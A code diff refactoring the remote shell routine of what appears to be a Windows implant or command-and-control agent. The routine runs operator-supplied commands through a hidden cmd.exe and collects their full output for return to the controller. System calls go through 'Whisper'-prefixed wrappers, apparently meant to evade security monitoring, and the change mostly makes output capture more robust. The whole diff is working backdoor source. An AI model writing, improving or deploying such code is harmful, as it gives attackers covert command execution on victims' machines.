@@ -334,98 +334,133 @@ void get_username(OutboundJsonDataStruct *response_struct)
     }
 }
 
+/**
+ * @brief Executes a shell command via cmd.exe, captures its stdout and stderr,
+ *        and stores the combined output in the provided response struct.
+ *
+ * This function performs the following steps:
+ *   1. Creates an anonymous pipe to capture the child process’s stdout and stderr.
+ *   2. Launches `cmd.exe /C "<args>"` as a hidden process with handles inherited.
+ *   3. Waits for the process to exit, then closes the write end of the pipe.
+ *   4. Reads all data from the pipe into a dynamically‑resizing heap buffer.
+ *   5. Replaces any existing `response_struct->command_result_data` with the full output.
+ *   6. On error at any stage, formats the system error message and stores it instead.
+ *
+ * Ownership and cleanup:
+ *   - The heap buffer for the command output is freed before return.
+ *   - Any preexisting `response_struct->command_result_data` is freed prior to assignment.
+ *   - All Windows handles (process, thread, pipe ends) are closed on both success and failure paths.
+ *
+ * @param response_struct  Pointer to an OutboundJsonDataStruct where the captured output
+ *                         or error message will be stored.
+ * @param args             Null‑terminated C string of arguments to pass to `cmd.exe /C`.
+ */
 void shell(OutboundJsonDataStruct *response_struct, char *args)
 {
-    /*
-        Executes a shell command using cmd.exe.
-
-        This function creates a child process running cmd.exe with the given
-        command.  It captures the output of the command via pipes and sends it
-        back to the client.
-    */
-
-    SECURITY_ATTRIBUTES sa;
-    HANDLE hRead, hWrite;
+    // Security attributes for pipe handles
+    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
+    HANDLE hRead = NULL, hWrite = NULL;
     PROCESS_INFORMATION pi;
-    STARTUPINFO si;
-    char buffer[PIPE_READ_SIZE_BUFFER]; // More descriptive name
+    STARTUPINFOA si;
+    char buffer[PIPE_READ_SIZE_BUFFER];
     DWORD bytesRead;
     BOOL success;
 
-    // Security attributes for pipe handles
-    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
-    sa.bInheritHandle = TRUE;
-    sa.lpSecurityDescriptor = NULL;
-
-    // Create pipe
+    // Create the pipe
     if (!WhisperCreatePipe(&hRead, &hWrite, &sa, 0))
     {
-        DWORD error = GetLastError();
-        DEBUG_LOGF(stderr, "CreatePipe failed (%lu)\n", error);
-        char error_message[256];
-        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
-        set_response_data(response_struct, error_message);
-        return; // Important: Return on error
+        DWORD err = GetLastError();
+        char errMsg[256];
+        WhisperFormatMessageA(
+            FORMAT_MESSAGE_FROM_SYSTEM, NULL, err,
+            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+            errMsg, sizeof(errMsg), NULL);
+        set_response_data(response_struct, errMsg);
+        return;
     }
     WhisperSetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
 
-    // Create child process
+    // Launch cmd.exe /C "<args>" hidden, with stdout+stderr redirected to our pipe
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
     si.hStdOutput = hWrite;
     si.hStdError = hWrite;
-    si.dwFlags |= STARTF_USESTDHANDLES;
-    si.dwFlags |= CREATE_NO_WINDOW; // Hides the console window
+    si.dwFlags |= STARTF_USESTDHANDLES | CREATE_NO_WINDOW;
 
     char cmdLine[CLI_INPUT_SIZE_BUFFER];
     snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /C \"%s\"", args);
 
     ZeroMemory(&pi, sizeof(pi));
-    success = WhisperCreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, PROCESS_SPAWN_DIRECTORY, &si, &pi);
-
+    success = WhisperCreateProcessA(
+        NULL,
+        cmdLine,
+        NULL, NULL,
+        TRUE,
+        0,
+        NULL,
+        PROCESS_SPAWN_DIRECTORY,
+        &si,
+        &pi);
     if (!success)
     {
-        DWORD error = GetLastError();
-        DEBUG_LOGF(stderr, "[!] CreateProcess failed (%lu)\n", error);
-        char error_message[256];
-        WhisperFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
-        set_response_data(response_struct, error_message);
-
+        DWORD err = GetLastError();
+        char errMsg[256];
+        WhisperFormatMessageA(
+            FORMAT_MESSAGE_FROM_SYSTEM, NULL, err,
+            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+            errMsg, sizeof(errMsg), NULL);
+        set_response_data(response_struct, errMsg);
         WhisperCloseHandle(hWrite);
         WhisperCloseHandle(hRead);
-        return; // Important: Return on error
+        return;
     }
 
+    // Wait for the process and close the write end so we can read EOF
     WhisperWaitForSingleObject(pi.hProcess, INFINITE);
     WhisperCloseHandle(hWrite);
 
-    // Read pipe
-    char output_buffer[PIPE_READ_SIZE_BUFFER] = ""; // Initialize an empty string
-    DWORD totalBytesRead = 0;
+    // Dynamically growable buffer for the output
+    size_t cap = PIPE_READ_SIZE_BUFFER, len = 0;
+    char *output = malloc(cap);
+    if (!output)
+    {
+        WhisperCloseHandle(pi.hProcess);
+        WhisperCloseHandle(pi.hThread);
+        WhisperCloseHandle(hRead);
+        return;
+    }
+    output[0] = '\0';
 
+    // Read all data from the pipe
     while (TRUE)
     {
         success = WhisperReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
         if (!success || bytesRead == 0)
-        {
             break;
-        }
-
         buffer[bytesRead] = '\0';
         DEBUG_LOG("%s", buffer);
 
-        // Append to the output buffer (handle potential buffer overflow)
-        size_t available = sizeof(output_buffer) - strlen(output_buffer) - 1;
-        size_t to_copy = min(available, (size_t)bytesRead); // Safe copy
-        strncat(output_buffer, buffer, to_copy);
-        totalBytesRead += bytesRead;
+        // Expand output buffer if needed
+        if (len + bytesRead + 1 > cap)
+        {
+            size_t newCap = cap * 2 + bytesRead;
+            char *tmp = realloc(output, newCap);
+            if (!tmp)
+                break; // out of memory, stop appending
+            output = tmp;
+            cap = newCap;
+        }
+        memcpy(output + len, buffer, bytesRead);
+        len += bytesRead;
+        output[len] = '\0';
     }
 
-    // Generate response
+    // Send the full output back
     free(response_struct->command_result_data);
-    set_response_data(response_struct, output_buffer); // Send accumulated output
+    set_response_data(response_struct, output);
+    free(output);
 
-    // Cleanup
+    // Cleanup handles
     WhisperCloseHandle(pi.hProcess);
     WhisperCloseHandle(pi.hThread);
     WhisperCloseHandle(hRead);
